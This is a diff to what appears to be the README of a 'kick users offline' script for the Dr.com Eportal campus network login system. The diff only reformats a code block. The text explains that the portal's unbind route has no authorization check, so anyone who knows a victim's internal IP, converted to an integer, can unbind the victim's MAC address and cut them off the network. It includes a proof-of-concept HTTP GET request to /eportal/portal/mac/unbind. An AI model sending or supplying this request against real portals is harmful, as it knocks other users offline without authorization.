@@ -11,7 +11,8 @@ Dr.com Eportal校园网认证--踹人下线脚本
 由于未对unbind路由做验证，导致任意知道受害者内网ip地址的人员，在使用一个简易将ip地址转换为int整型数字的算法后，可以实现无授权解绑目标mac地址，实现断网效果。
 
 ***POC:***
-```GET /eportal/portal/mac/unbind?wlan_user_mac=000000000000&wlan_user_ip={ipToParseIntValue}&lang=en HTTP/1.1
+```
+GET /eportal/portal/mac/unbind?wlan_user_mac=000000000000&wlan_user_ip={ipToParseIntValue}&lang=en HTTP/1.1
 Host: xx.xx.xx.xx:xxx
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
 Accept: */*
